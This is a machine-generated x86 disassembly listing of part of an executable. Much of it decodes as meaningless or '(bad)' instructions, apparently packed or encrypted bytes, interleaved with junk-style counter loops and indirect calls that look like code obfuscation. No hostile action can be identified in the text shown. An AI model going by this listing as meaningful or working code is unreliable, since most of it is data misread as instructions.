  40afc9:	and    eax,0x2c4b029
  40afce:	pop    edx
  40afcf:	aad    0x94
  40afd1:	sbb    BYTE PTR [edx+0x1e],dh
  40afd4:	dec    eax
  40afd6:	sub    ch,dl
  40afd8:	hlt    
  40afd9:	push   ebx
  40afda:	xlat   BYTE PTR ds:[ebx]
  40afdb:	loopne 0x40af65
  40afdd:	jae    0x40afa6
  40afdf:	lahf   
  40afe0:	mov    ds:0xa0ef5331,al
  40afe5:	cmp    ecx,DWORD PTR [edx+ebp*8-0xfb2d537]
  40afec:	mov    edi,0x7518a866
  40aff1:	dec    esp
  40aff2:	dec    BYTE PTR [ebx]
  40aff4:	dec    edi
  40aff5:	fstp   TBYTE PTR [ecx-0x5d7a506c]
  40affb:	(bad)  
  40affc:	into   
  40affd:	or     DWORD PTR [eax-0x70],edx
  40b000:	push   ax
  40b002:	lock or cl,BYTE PTR [ecx]
  40b005:	or     BYTE PTR [ebp+0x63a66d84],0x78
  40b00c:	xor    eax,0x2faa35fb
  40b011:	xlat   BYTE PTR ds:[ebx]
  40b012:	fimul  DWORD PTR [ebp-0x1b]
  40b015:	mov    esi,0xc07a632a
  40b01a:	repz and cl,BYTE PTR [ecx-0x2]
  40b01e:	pop    eax
  40b01f:	nop
  40b020:	lahf   
  40b021:	pop    edi
  40b022:	dec    edi
  40b023:	push   0x80d626e7
  40b028:	stos   DWORD PTR es:[edi],eax
  40b029:	in     eax,dx
  40b02a:	dec    ebx
  40b02b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b02c:	es xor eax,0x7a26500
  40b032:	jno    0x40aff7
  40b034:	addr16 pop ds
  40b036:	cmp    ebx,DWORD PTR [ebp+0x7eec7df]
  40b03c:	inc    edi
  40b03d:	rol    DWORD PTR [ebp+0x3],1
  40b040:	xchg   ebx,eax
  40b041:	sbb    DWORD PTR [edx+0xeb11608],eax
  40b047:	or     eax,0xd8cf0edd
  40b04c:	mov    eax,ds:0x50ecf9f5
  40b051:	fs ins DWORD PTR es:[edi],dx
  40b053:	fs pop ebx
  40b055:	mov    ch,0xe5
  40b057:	stos   BYTE PTR es:[edi],al
  40b058:	sub    ebp,eax
  40b05a:	repnz mov cs,ebx
  40b05d:	mov    ebx,ebx
  40b05f:	sbb    al,0xa1
  40b061:	mov    dh,0xc9
  40b063:	leave  
  40b064:	std    
  40b065:	fidivr WORD PTR [eax]
  40b067:	ret    
  40b068:	out    0xd2,al
  40b06a:	inc    esi
  40b06b:	std    
  40b06c:	je     0x40b072
  40b06e:	or     BYTE PTR [esi-0x61],dh
  40b071:	xor    edx,DWORD PTR [ebp+eax*2-0x75f6de71]
  40b078:	sar    BYTE PTR [eax+0x17709536],cl
  40b07e:	jmp    0x820:0x63f01087
  40b085:	inc    ecx
  40b086:	dec    esp
  40b087:	and    al,0x7a
  40b089:	mov    WORD PTR [edx-0x2ef3b609],es
  40b08f:	data16 imul bx,WORD PTR [ecx+0x6cfd01a4],0xd132
  40b099:	(bad)  
  40b09a:	sbb    BYTE PTR [bp+di],dh
  40b09d:	ret    0xf233
  40b0a0:	add    eax,ecx
  40b0a2:	add    esi,ecx
  40b0a4:	imul   eax,esi
  40b0a7:	mov    esi,DWORD PTR [ebp+0xc]
  40b0aa:	cmp    esi,eax
  40b0ac:	mov    eax,DWORD PTR [ebp-0x4]
  40b0af:	je     0x40aa89
  40b0b5:	xor    eax,edx
  40b0b7:	add    eax,ecx
  40b0b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40b0bc:	imul   eax,ecx
  40b0bf:	add    eax,DWORD PTR [ebp+0x8]
  40b0c2:	mov    DWORD PTR [ebp+0xc],eax
  40b0c5:	mov    eax,DWORD PTR [ebp+0xc]
  40b0c8:	jmp    0x40b2c3
  40b0cd:	fadd   QWORD PTR [edi-0x18]
  40b0d0:	(bad)  
  40b0d1:	ins    DWORD PTR es:[edi],dx
  40b0d2:	jns    0x40b0d0
  40b0d4:	pop    ebp
  40b0d5:	xchg   BYTE PTR [ebx+0xb],cl
  40b0d8:	xor    dl,BYTE PTR [edi-0x6227c7a0]
  40b0de:	loop   0x40b15e
  40b0e0:	jle    0x40b13e
  40b0e2:	jg     0x40b162
  40b0e4:	jle    0x40b0e8
  40b0e6:	cmc    
  40b0e7:	adc    eax,0xb813990b
  40b0ec:	es add al,0x4d
  40b0ef:	jo     0x40b08f
  40b0f1:	daa    
  40b0f2:	mov    esp,0xc9d56ac4
  40b0f7:	jnp    0x40b104
  40b0f9:	xchg   esp,eax
  40b0fa:	nop
  40b0fb:	(bad)  
  40b0fc:	fcom   DWORD PTR [edx]
  40b0fe:	sbb    DWORD PTR [edi-0x40],eax
  40b101:	mov    cl,BYTE PTR [eax]
  40b103:	sbb    ebx,ebp
  40b105:	cmp    al,0x7b
  40b107:	and    edi,esi
  40b109:	adc    bl,BYTE PTR [esi]
  40b10b:	inc    ecx
  40b10c:	ins    BYTE PTR es:[edi],dx
  40b10d:	(bad)  
  40b10f:	es lahf 
  40b111:	adc    edx,esp
  40b113:	dec    esp
  40b114:	mov    DWORD PTR [ebx],ebx
  40b116:	push   ecx
  40b117:	mov    eax,ds:0xc69a6d77
  40b11c:	mov    ebx,0xadc7b4a0
  40b121:	aas    
  40b122:	(bad)  
  40b123:	xor    ebp,esp
  40b125:	sbb    ah,0x85
  40b128:	fs cs dec ebp
  40b12b:	stos   DWORD PTR es:[edi],eax
  40b12c:	fcomip st,st(6)
  40b12e:	push   0xffffff9c
  40b130:	jp     0x40b0b4
  40b132:	xchg   al,dh
  40b134:	jb     0x40b150
  40b136:	mov    esp,0xee5f3676
  40b13b:	scas   al,BYTE PTR es:[edi]
  40b13c:	jge    0x40b19d
  40b13e:	add    eax,0xfa528e46
  40b143:	adc    DWORD PTR [esi-0x7],edi
  40b146:	mov    ebx,0x1f46c7d9
  40b14b:	mov    WORD PTR [ebx-0x2c96ad17],fs
  40b151:	xchg   BYTE PTR [ebp-0x77078290],ch
  40b157:	loop   0x40b15a
  40b159:	punpckhbw mm4,mm2
  40b15c:	push   ebp
  40b15d:	mov    bl,0x56
  40b15f:	jns    0x40b1bd
  40b161:	mov    eax,ds:0x2eeeaa77
  40b166:	aaa    
  40b167:	or     eax,0xa69ce43e
  40b16c:	and    BYTE PTR [esi+0x7fd7870c],bl
  40b172:	inc    edi
  40b173:	inc    edi
  40b174:	inc    ebp
  40b175:	and    ebx,DWORD PTR [edi]
  40b177:	mov    ds:0x3fd94d5f,eax
  40b17c:	sbb    al,0x5
  40b17e:	dec    ebp
  40b17f:	rcl    DWORD PTR [eax-0x6c],cl
  40b182:	add    al,0x1a
  40b184:	dec    BYTE PTR [esi+0x3d97939e]
  40b18a:	imul   ebp,DWORD PTR [ebp+0x15],0xffffffbb
  40b18e:	and    BYTE PTR [eax-0x2f0ecf51],cl
  40b194:	outs   dx,DWORD PTR ds:[esi]
  40b195:	stc    
  40b196:	out    0x24,eax
  40b198:	jle    0x40b1eb
  40b19a:	inc    edx
  40b19b:	(bad)  
  40b19c:	mov    ch,0x71
  40b19e:	push   edi
  40b19f:	mov    al,0xff
  40b1a1:	ja     0x40b207
  40b1a3:	jp     0x40b21a
  40b1a5:	cmc    
  40b1a6:	clc    
  40b1a7:	pop    ebp
  40b1a8:	adc    BYTE PTR [ebx],0x87
  40b1ab:	ss retf 
  40b1ad:	sub    eax,0x7eb648de
  40b1b2:	out    0x71,eax
  40b1b4:	sub    BYTE PTR [edx-0x38],bh
  40b1b7:	cmp    ch,BYTE PTR [esi]
  40b1b9:	mov    esp,0xc708c405
  40b1be:	adc    edi,DWORD PTR [edx]
  40b1c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1c1:	mov    bh,0xfc
  40b1c3:	sub    ebx,DWORD PTR [edx+0x5b]
  40b1c6:	std    
  40b1c7:	or     al,0xb6
  40b1c9:	jmp    0x40b1f1
  40b1cb:	push   DWORD PTR [eax+0x23]
  40b1ce:	cmp    al,0x9b
  40b1d0:	imul   esi,DWORD PTR [ebp-0x257ee86f],0x7e
  40b1d7:	lahf   
  40b1d8:	add    al,0xed
  40b1da:	retf   
  40b1db:	pop    ds
  40b1dc:	pop    edi
  40b1dd:	scas   eax,DWORD PTR es:[edi]
  40b1de:	call   0x12d7:0xb896c929
  40b1e5:	xchg   ecx,eax
  40b1e6:	(bad)  [edi+esi*1+0x1db2b3ae]
  40b1ed:	leave  
  40b1ee:	adc    ebx,DWORD PTR [esi+0x72]
  40b1f1:	arpl   WORD PTR [edi],cx
  40b1f3:	pop    ss
  40b1f4:	mov    dh,0x85
  40b1f6:	pop    edi
  40b1f7:	leave  
  40b1f8:	jmp    0x4f5e857c
  40b1fd:	das    
  40b1fe:	adc    BYTE PTR [ecx-0x2d],0xce
  40b202:	retf   
  40b203:	cmc    
  40b204:	les    esp,FWORD PTR [eax]
  40b206:	clc    
  40b207:	pop    ecx
  40b208:	xor    eax,0x11987e01
  40b20d:	push   es
  40b20e:	mov    ecx,0x3c0342c7
  40b213:	mov    ds:0xe4982fd8,eax
  40b218:	fisubr DWORD PTR [esi+0x14014458]
  40b21e:	cmp    ebx,ecx
  40b220:	xchg   esp,eax
  40b221:	xchg   edx,eax
  40b222:	addr16 test ax,0x4e0a
  40b227:	sbb    edi,esi
  40b229:	frstor [esi+ebx*4]
  40b22c:	mov    fs,esi
  40b22e:	push   ebx
  40b22f:	sub    bh,dl
  40b231:	jne    0x40b253
  40b233:	jmp    0x6c6c:0x4962aafe
  40b23a:	pop    edi
  40b23b:	jp     0x40b1be
  40b23d:	fwait
  40b23e:	xlat   BYTE PTR ds:[ebx]
  40b23f:	xchg   DWORD PTR [ecx-0x2b],ecx
  40b242:	inc    ebx
  40b243:	jmp    0xf716:0x7faf24d1
  40b24a:	inc    edi
  40b24b:	inc    eax
  40b24c:	sti    
  40b24d:	pop    ecx
  40b24e:	in     al,0x6
  40b250:	push   0x4f
  40b252:	fs (bad) 
  40b254:	fsub   QWORD PTR [ebx]
  40b256:	dec    ecx
  40b257:	out    dx,al
  40b258:	add    al,0x94
  40b25a:	mov    ah,0xe0
  40b25c:	mov    WORD PTR [ecx],ds
  40b25e:	les    ecx,FWORD PTR [ebx+0x25]
  40b261:	cmp    ebx,eax
  40b263:	into   
  40b264:	and    al,0xc9
  40b266:	ficom  WORD PTR [ecx]
  40b268:	sbb    ecx,esi
  40b26a:	lock xchg BYTE PTR [esi-0x57],ah
  40b26e:	or     BYTE PTR [eax+0x67bf7fb8],dh
  40b274:	mov    esi,0x7a093719
  40b279:	mov    esp,0x7382e620
  40b27e:	pop    edx
  40b27f:	mov    ebx,0x399c4ca6
  40b284:	add    al,0x1e
  40b286:	cmp    dh,BYTE PTR ds:0xfa90d59d
  40b28c:	and    ecx,ecx
  40b28e:	ds sar ebx,0xcb
  40b292:	pop    ss
  40b293:	dec    esp
  40b294:	cli    
  40b295:	aam    0x64
  40b297:	ins    BYTE PTR es:[edi],dx
  40b298:	stos   BYTE PTR es:[edi],al
  40b299:	fst    QWORD PTR [edx+0x1d]
  40b29c:	stc    
  40b29d:	hlt    
  40b29e:	in     al,0x45
  40b2a0:	jmp    0x40b292
  40b2a2:	xchg   esi,eax
  40b2a3:	sub    esi,esi
  40b2a5:	and    edx,esp
  40b2a7:	addr16 out dx,al
  40b2a9:	jbe    0x40b242
  40b2ab:	xor    eax,0x23f7109e
  40b2b0:	wrmsr  
  40b2b2:	(bad)  
  40b2b3:	mov    dl,0xa4
  40b2b5:	sub    BYTE PTR [edx-0xa],cl
  40b2b8:	add    eax,0x25720a24
  40b2bd:	jg     0x40b282
  40b2bf:	repnz xor cl,bh
  40b2c2:	test   al,0x5e
  40b2c4:	leave  
  40b2c5:	ret    0x8
  40b2c8:	push   ebp
  40b2c9:	mov    ebp,esp
  40b2cb:	sub    esp,0x30
  40b2ce:	mov    eax,ds:0x43056e
  40b2d3:	mov    ecx,DWORD PTR ds:0x43057a
  40b2d9:	sub    ecx,eax
  40b2db:	imul   eax,DWORD PTR [eax+ecx*1]
  40b2df:	jmp    0x40b43d
  40b2e4:	adc    eax,0x6533e552
  40b2e9:	inc    ebp
  40b2ea:	and    eax,0x241ce54
  40b2ef:	scas   al,BYTE PTR es:[edi]
  40b2f0:	mov    cl,0x21
  40b2f2:	pop    es
  40b2f3:	(bad)  
  40b2f4:	sti    
  40b2f5:	in     al,0x7e
  40b2f7:	jle    0x40b338
  40b2f9:	jg     0x40b379
  40b2fb:	jle    0x40b2b5
  40b2fd:	pop    esp
  40b2fe:	test   esi,eax
  40b300:	mov    esp,fs
  40b302:	xor    DWORD PTR [ebx+0x3b],ecx
  40b305:	add    esi,esi
  40b307:	es mov al,BYTE PTR fs:[esi-0x12]
  40b30c:	(bad)  
  40b30d:	in     al,dx
  40b30e:	rcr    DWORD PTR [esi-0xe],cl
  40b311:	iret   
  40b312:	out    dx,al
  40b313:	pushf  
  40b314:	ja     0x40b31e
  40b316:	adc    esp,ebp
  40b318:	push   cs
  40b319:	nop    DWORD PTR [eax-0x7e]
  40b31d:	cmp    DWORD PTR [edx+0x2decadab],edi
  40b323:	jno    0x40b2bf
  40b325:	adc    al,0x20
  40b327:	jne    0x40b396
  40b329:	pop    esp
  40b32a:	jns    0x40b336
  40b32c:	popf   
  40b32d:	(bad)  
  40b32f:	repnz cmp ebx,DWORD PTR [edi+0x21]
  40b333:	cmp    BYTE PTR fs:[esi+0x66253d13],0x45
  40b33b:	dec    edx
  40b33c:	in     eax,0x46
  40b33e:	loope  0x40b327
  40b340:	pop    edx
  40b341:	xor    BYTE PTR [eax+0x1ecf8579],bl
  40b347:	inc    esi
  40b348:	dec    esp
  40b349:	adc    ebp,DWORD PTR [eax-0x5f]
  40b34c:	mov    WORD PTR [ebp-0x3cdde802],ss
  40b352:	icebp  
  40b353:	and    al,0x93
  40b355:	or     DWORD PTR [eax-0x6b],edi
  40b358:	lods   eax,DWORD PTR ds:[esi]
  40b359:	ret    0xc173
  40b35c:	nop
  40b35d:	jb     0x40b37e
  40b35f:	ins    DWORD PTR es:[edi],dx
  40b360:	or     BYTE PTR [eax+0x1e],cl
  40b363:	xor    esi,DWORD PTR [ebp+0x60549d06]
  40b369:	test   al,0xe1
  40b36b:	outs   dx,DWORD PTR ds:[esi]
  40b36c:	or     BYTE PTR [ebp-0x18d8a1c0],ch
  40b372:	fucom  st(1)
  40b374:	or     eax,0x3202853e
  40b379:	aas    
  40b37a:	hlt    
  40b37b:	mov    ds:0x7c1fab9b,eax
  40b380:	stc    
  40b381:	adc    eax,0xcff12d97
  40b386:	std    
  40b387:	dec    ebp
  40b388:	mov    eax,0xb40de4f9
  40b38d:	or     dh,al
  40b38f:	dec    esi
  40b390:	aas    
  40b391:	pop    ebp
  40b392:	and    eax,0x1ad989ca
  40b397:	out    0x3f,al
  40b399:	xchg   ebp,eax
  40b39a:	adc    DWORD PTR [eax],esi
  40b39c:	(bad)  
  40b39d:	arpl   WORD PTR [edi-0x3738bed3],bx
  40b3a3:	fwait
  40b3a4:	adc    dh,0x65
  40b3a7:	fiadd  DWORD PTR ds:0xa503ba3b
  40b3ad:	je     0x40b3cd
  40b3af:	loopne 0x40b428
  40b3b1:	gs scas al,BYTE PTR es:[edi]
  40b3b3:	loopne 0x40b410
  40b3b5:	xlat   BYTE PTR ds:[ebx]
  40b3b6:	mov    gs,WORD PTR [esi+0x1b4ac64f]
  40b3bc:	(bad)  
  40b3bd:	popf   
  40b3be:	inc    eax
  40b3bf:	mov    es:0x4d09a9a0,al
  40b3c5:	adc    ecx,eax
  40b3c7:	fisttp WORD PTR [edi+0x4ce88b28]
  40b3cd:	inc    ebx
  40b3ce:	push   edi
  40b3cf:	stos   DWORD PTR es:[edi],eax
  40b3d0:	sbb    DWORD PTR [ebx+0x16],ebp
  40b3d3:	dec    esp
  40b3d4:	fist   WORD PTR [esi]
  40b3d6:	jp     0x40b38e
  40b3d8:	inc    esp
  40b3d9:	dec    esi
  40b3da:	call   0x2c11:0x88f82920
  40b3e1:	push   edi
  40b3e2:	clc    
  40b3e3:	jmp    0x803d:0xa66f1465
  40b3ea:	jo     0x40b453
  40b3ec:	mov    al,0x61
  40b3ee:	mov    bl,0x3a
  40b3f0:	cmp    DWORD PTR [eax+0x48],ebx
  40b3f3:	push   cs
  40b3f4:	adc    ebp,DWORD PTR [esi]
  40b3f6:	pushf  
  40b3f7:	adc    eax,DWORD PTR [ebp+0x38]
  40b3fa:	pop    es
  40b3fb:	int    0xb6
  40b3fd:	xor    BYTE PTR [edx+0x6c],dh
  40b400:	sti    
  40b401:	aas    
  40b402:	lahf   
  40b403:	adc    BYTE PTR [ebx-0x4d355d8b],ah
  40b409:	int3   
  40b40a:	lea    ebx,[eax+0xfa42c51]
  40b410:	push   edx
  40b411:	jl     0x40b3a2
  40b413:	popf   
  40b414:	fld    DWORD PTR [ecx]
  40b416:	fidivr WORD PTR [ebx]
  40b418:	mov    ds:0x51fa6618,eax
  40b41d:	xor    al,0x38
  40b41f:	je     0x40b42a
  40b421:	push   eax
  40b422:	cld    
  40b423:	and    ecx,edx
  40b425:	call   0xf74f:0xfee23f07
  40b42c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b42d:	add    BYTE PTR [ebp+0x19e0bb28],0x74
  40b434:	and    al,0x86
  40b436:	inc    edx
  40b437:	out    0xbb,al
  40b439:	push   ebp
  40b43a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b43b:	jmp    0x40b46b
  40b43d:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40b444:	mov    DWORD PTR ds:0x43054e,0x11
  40b44e:	cmp    DWORD PTR ds:0x43054e,0x0
  40b455:	je     0x40b489
  40b45b:	cmp    DWORD PTR ds:0x43054e,0x19
  40b462:	jne    0x40b479
  40b468:	push   DWORD PTR [ebp-0x24]
  40b46b:	push   DWORD PTR [ebp-0x20]
  40b46e:	push   0x41ff
  40b473:	call   DWORD PTR ds:0x42eae8
  40b479:	mov    eax,ds:0x43054e
  40b47e:	dec    eax
  40b47f:	mov    ds:0x43054e,eax
  40b484:	jmp    0x40b44e
  40b489:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40b490:	or     eax,0x1c5c
  40b495:	mov    ecx,DWORD PTR [ebp-0x4]
  40b498:	push   ebx
  40b499:	add    DWORD PTR ds:0x4304ae,edi
  40b49f:	mov    eax,0x7510856
  40b4a4:	mov    ebx,DWORD PTR ds:0x430542
  40b4aa:	sbb    DWORD PTR ds:0x42e762,ebx
  40b4b0:	xor    ecx,eax
  40b4b2:	mov    ebx,DWORD PTR ds:0x42ee14
  40b4b8:	sub    DWORD PTR ds:0x43048e,ebx
  40b4be:	mov    ebx,0x32729d
  40b4c3:	xor    DWORD PTR ds:0x430546,0xece
  40b4cd:	add    ecx,ebx
  40b4cf:	xor    DWORD PTR ds:0x430496,0x42e76a
  40b4d9:	mov    DWORD PTR [ebp-0x1c],ecx
  40b4dc:	mov    ecx,DWORD PTR [ebp+0x14]
  40b4df:	xor    DWORD PTR ds:0x42ee1c,0x65f3
  40b4e9:	push   esi
  40b4ea:	sub    DWORD PTR ds:0x42e762,0x2022
  40b4f4:	push   edi
  40b4f5:	and    DWORD PTR ds:0x430546,0x430492
  40b4ff:	test   ecx,ecx
  40b501:	mov    DWORD PTR ds:0x42e75e,0x17b6
  40b50b:	je     0x40b58a
  40b511:	add    ecx,0x2345
  40b517:	mov    ecx,DWORD PTR [ebp+0x14]
  40b51a:	and    DWORD PTR ds:0x4304a6,0x0
  40b524:	jmp    0x40b536
  40b529:	mov    edi,DWORD PTR ds:0x4304a6
  40b52f:	inc    edi
  40b530:	mov    DWORD PTR ds:0x4304a6,edi
  40b536:	cmp    DWORD PTR ds:0x4304a6,0x1d
  40b53d:	jae    0x40b585
  40b543:	cmp    DWORD PTR ds:0x4304a6,0x4
  40b54a:	jne    0x40b560
  40b550:	push   0x42ee1c
  40b555:	push   0x6d9e
  40b55a:	call   DWORD PTR ds:0x42eaec
  40b560:	cmp    DWORD PTR ds:0x4304a6,0x3
  40b567:	jne    0x40b57a
  40b56d:	mov    edi,DWORD PTR ds:0x4304a6
  40b573:	inc    edi
  40b574:	mov    DWORD PTR ds:0x4304a6,edi
  40b57a:	jmp    0x40b529
  40b57f:	and    esi,0x3dcd
  40b585:	mov    ecx,DWORD PTR [ecx]
  40b587:	mov    DWORD PTR [ebp-0x1c],ecx
  40b58a:	movzx  esi,BYTE PTR ds:0x430492
  40b591:	xor    DWORD PTR ds:0x4304ba,esi
  40b597:	imul   edx,eax
  40b59a:	or     DWORD PTR ds:0x4304be,edx
  40b5a0:	mov    ecx,0x4573
  40b5a5:	xor    esi,DWORD PTR ds:0x430486
  40b5ab:	add    edx,ecx
  40b5ad:	mov    esi,0x7879
  40b5b2:	and    DWORD PTR ds:0x43053e,0x0
  40b5bc:	mov    edi,DWORD PTR ds:0x43053e
  40b5c2:	inc    edi
  40b5c3:	mov    DWORD PTR ds:0x43053e,edi
  40b5c9:	cmp    DWORD PTR ds:0x43053e,0x12
  40b5d0:	jne    0x40b5f7
  40b5d6:	push   0x1
  40b5d8:	push   0x3333
  40b5dd:	push   0x7164
  40b5e2:	push   0x26d7
  40b5e7:	push   0x1d14
  40b5ec:	push   0x64d6
  40b5f1:	call   DWORD PTR ds:0x42eaf0
  40b5f7:	cmp    DWORD PTR ds:0x43053e,0x11
  40b5fe:	jne    0x40b613
  40b604:	xor    edi,edi
  40b606:	or     edi,DWORD PTR ds:0x43053e
  40b60c:	inc    edi
  40b60d:	mov    DWORD PTR ds:0x43053e,edi
  40b613:	cmp    DWORD PTR ds:0x43053e,0x1f
  40b61a:	jb     0x40b5bc
  40b620:	dec    edi
  40b621:	mov    edi,0x1556
  40b626:	xchg   esi,ecx
  40b628:	sub    edx,edi
  40b62a:	xor    esi,esi
  40b62c:	jmp    0x40b78a
  40b631:	mov    ch,dh
  40b633:	add    esi,DWORD PTR [eax+0x7b]
  40b636:	aad    0x9d
  40b638:	jl     0x40b646
  40b63a:	mov    eax,0x8dd54dc4
  40b63f:	cli    
  40b640:	fwait
  40b641:	mov    esp,0x3f7e7ee5
  40b646:	jg     0x40b6c6
  40b648:	jle    0x40b675
  40b64a:	sbb    al,0xe7
  40b64c:	sub    eax,0x5b10082c
  40b651:	jle    0x40b602
  40b653:	push   ecx
  40b654:	sub    DWORD PTR [ebp-0x2af68d59],ebx
  40b65a:	popf   
  40b65b:	sti    
  40b65c:	mov    esi,0x4c72c994
  40b661:	xchg   esi,eax
  40b662:	(bad)  [ebp+0x5e4ff15f]
  40b668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b669:	mov    al,ds:0x717dc658
  40b66e:	mov    edi,0x8288035d
  40b673:	pop    es
  40b674:	inc    ecx
  40b675:	jecxz  0x40b641
  40b677:	ret    
  40b678:	(bad)  
  40b679:	repnz dec edi
  40b67b:	or     al,0x3f
  40b67d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b67e:	lods   al,BYTE PTR ds:[esi]
  40b67f:	jmp    0x40b621
  40b681:	mov    ss,WORD PTR [edi]
  40b683:	dec    edx
  40b684:	aaa    
  40b685:	mov    ?,WORD PTR [ebx-0x125d314]
  40b68b:	inc    ecx
  40b68c:	pusha  
  40b68d:	repnz stos DWORD PTR es:[edi],eax
  40b68f:	xchg   edx,eax
  40b690:	repnz std 
  40b692:	dec    eax
  40b693:	ins    DWORD PTR es:[edi],dx
  40b694:	mov    edi,0x35e5d321
  40b699:	mov    dh,0xe7
  40b69b:	mov    DWORD PTR [eax+0x3ad1ad95],esp
  40b6a1:	loop   0x40b69c
  40b6a3:	or     BYTE PTR [esi+0x3906a461],0x25
  40b6aa:	mov    DWORD PTR [esp+eiz*4-0x183ab26f],ecx
  40b6b1:	ss (bad) 
  40b6b3:	lock xor DWORD PTR [edi-0x26],ecx
  40b6b7:	inc    edi
  40b6b8:	repz push edi
  40b6ba:	stos   DWORD PTR es:[edi],eax
  40b6bb:	sub    DWORD PTR [edx-0x1c],edi
  40b6be:	sbb    BYTE PTR [edi-0x613fd022],dh
  40b6c4:	dec    ebp
  40b6c5:	sbb    ch,BYTE PTR [eax+esi*4]
  40b6c8:	retf   
  40b6c9:	mov    ecx,0x75167dbb
  40b6ce:	adc    DWORD PTR [edx-0x3c],eax
  40b6d1:	mov    dh,0xcf
  40b6d3:	cs shr bl,0xb3
  40b6d7:	into   
  40b6d8:	lea    esp,[esi]
  40b6da:	dec    ebp
  40b6db:	xor    dh,BYTE PTR [edi+0x2f42c666]
  40b6e1:	lods   eax,DWORD PTR ds:[esi]
  40b6e2:	adc    DWORD PTR [edi+0x74],0x305040b5
  40b6e9:	add    eax,0xd817cafe
  40b6ee:	adc    eax,0x8012018
  40b6f3:	fild   WORD PTR [esi-0x53]
  40b6f6:	inc    esi
  40b6f7:	rol    BYTE PTR [eax+0x64],cl
  40b6fa:	int    0x32
  40b6fc:	or     BYTE PTR ds:0xd553c7fb,ch
  40b702:	jg     0x40b773
  40b704:	xlat   BYTE PTR ss:[ebx]
  40b706:	jl     0x40b734
  40b708:	repnz pusha 
  40b70a:	xor    esi,0x52
  40b70d:	add    cl,bh
  40b70f:	ret    0x8ae3
  40b712:	cmp    ah,BYTE PTR ds:0x3bc51e8d
  40b718:	clc    
  40b719:	pop    es
  40b71a:	push   ss
  40b71b:	pop    eax
  40b71c:	and    eax,0x346f4a64
  40b721:	jl     0x40b77a
  40b723:	imul   esi,DWORD PTR [eax+edi*1],0xffffffb5
  40b727:	scas   eax,DWORD PTR es:[edi]
  40b728:	das    
  40b729:	sbb    edx,DWORD PTR [ecx+0x20000f07]
  40b72f:	pop    es
  40b730:	imul   ecx,ebp,0xb7296a2c
  40b736:	push   edx
  40b737:	lea    ecx,[ecx+0x3aaec4da]
  40b73d:	ds sub al,0x5f
  40b740:	and    BYTE PTR ds:0xd2a35ec3,0x93
  40b747:	xchg   edx,eax
  40b748:	sub    al,BYTE PTR [edx+ecx*8+0x33]
  40b74c:	ret    
  40b74d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b74e:	sub    BYTE PTR [ecx],0x6
  40b751:	mov    esi,0x71d44c5
  40b756:	cs cmp al,0xb2
  40b759:	fstp   TBYTE PTR [ebx]
  40b75b:	lds    esi,FWORD PTR ds:0x45bf628a
  40b761:	(bad)  
  40b762:	xchg   DWORD PTR [esi],ecx
  40b764:	lea    ebx,[ecx+0x3f]
  40b767:	out    0x44,al
  40b769:	sub    BYTE PTR [ebx+0x449df353],0x6f
  40b770:	out    0x96,al
  40b772:	lods   al,BYTE PTR ds:[esi]
  40b773:	ss and edx,edi
  40b776:	pop    ebp
  40b777:	xor    BYTE PTR [ecx+0x1cfe470],cl
  40b77d:	jge    0x40b7be
  40b77f:	(bad)  
  40b780:	cmp    DWORD PTR [edi],edx
  40b782:	imul   ebx,DWORD PTR [eax-0x7a],0x3e
  40b786:	pusha  
  40b787:	(bad)  
  40b788:	rcl    DWORD PTR [esi],cl
  40b78a:	mov    DWORD PTR [ebp-0x28],esi
  40b78d:	and    DWORD PTR ds:0x4304b2,ebx
  40b793:	mov    DWORD PTR [ebp-0x2c],esi
  40b796:	or     ecx,DWORD PTR ds:0x430542
  40b79c:	jmp    0x40b8fa
  40b7a1:	gs inc edi
  40b7a3:	xor    eax,0x657cedde
  40b7a8:	pop    ebp
  40b7a9:	xchg   edx,eax
  40b7aa:	lods   al,BYTE PTR ds:[esi]
  40b7ab:	mov    al,ds:0x2d64e297
  40b7b0:	or     eax,0x7e7ee67d
  40b7b5:	aas    
  40b7b6:	jg     0x40b836
  40b7b8:	jle    0x40b816
  40b7ba:	sub    DWORD PTR [ecx],esp
  40b7bc:	cwde   
  40b7bd:	jg     0x40b7ed
  40b7bf:	pushf  
  40b7c0:	cmp    dl,BYTE PTR [ebp+0x3a]
  40b7c3:	push   es
  40b7c4:	mov    cl,0x40
  40b7c6:	outs   dx,DWORD PTR ds:[esi]
  40b7c7:	daa    
  40b7c8:	bound  esp,QWORD PTR [eax]
  40b7ca:	mov    ds:0xf41cfa00,al
  40b7cf:	mov    dh,0x24
  40b7d1:	cs je  0x40b819
  40b7d4:	cmp    cl,ah
  40b7d6:	sbb    ah,cl
  40b7d8:	mov    dh,0xe0
  40b7da:	rcr    BYTE PTR [esi],cl
  40b7dc:	sar    DWORD PTR [ebx],cl
  40b7de:	sbb    cl,BYTE PTR [edi]
  40b7e0:	pushf  
  40b7e1:	jp     0x40b836
  40b7e3:	cmp    al,0xa2
  40b7e5:	inc    esp
  40b7e6:	xchg   ebp,eax
  40b7e7:	mov    al,0x86
  40b7e9:	popf   
  40b7ea:	sub    dl,BYTE PTR [edi+0x3d]
  40b7ed:	retf   
  40b7ee:	sub    eax,0x6ebf9dd0
  40b7f3:	fsub   QWORD PTR [eax]
  40b7f5:	fprem1 
  40b7f7:	mov    edi,0xb6222d77
  40b7fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7fd:	(bad)  
  40b7fe:	adc    DWORD PTR [edi+0x1035baca],esp
  40b804:	jb     0x40b87f
  40b806:	stos   BYTE PTR es:[edi],al
  40b807:	imul   esp,DWORD PTR [eax+0x12689f18],0x39c60df0
  40b811:	add    BYTE PTR [ecx],0x71
  40b814:	add    ecx,DWORD PTR [esi+0x7f]
  40b817:	sub    al,0xc9
  40b819:	jns    0x40b86e
  40b81b:	test   eax,0x4d19700c
  40b820:	xor    ah,BYTE PTR [edx-0x3c]
  40b823:	mov    ecx,0xa4c3411c
  40b828:	les    ecx,FWORD PTR [ebx]
  40b82a:	xchg   ebp,ebp
  40b82c:	test   eax,0xbf6db0e2
  40b831:	pop    ecx
